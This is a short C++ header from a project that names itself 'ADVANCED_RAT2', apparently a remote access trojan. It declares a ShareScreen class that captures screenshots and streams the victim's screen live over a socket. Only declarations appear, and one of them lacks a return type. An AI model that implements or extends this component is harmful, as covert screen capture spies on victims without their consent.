//
// Created by avita on 09/08/2020.
//

#ifndef ADVANCED_RAT2_SHARESCREEN_H
#define ADVANCED_RAT2_SHARESCREEN_H

#include <iostream>
#include <windows.h>
#include <GdiPlus.h>
#include "Connection.h"


using namespace std;
using namespace Gdiplus;


class ShareScreen {

    int Height = GetSystemMetrics(SM_CYSCREEN);
    int Width = GetSystemMetrics(SM_CXSCREEN);

    void takeScreenShoot(const wchar_t *path);

    int GetEncoderClsid(const WCHAR *format, CLSID *pClsid);


     compareImages();

    void ShareScreenLive(SOCKET socket);





};


#endif //ADVANCED_RAT2_SHARESCREEN_H
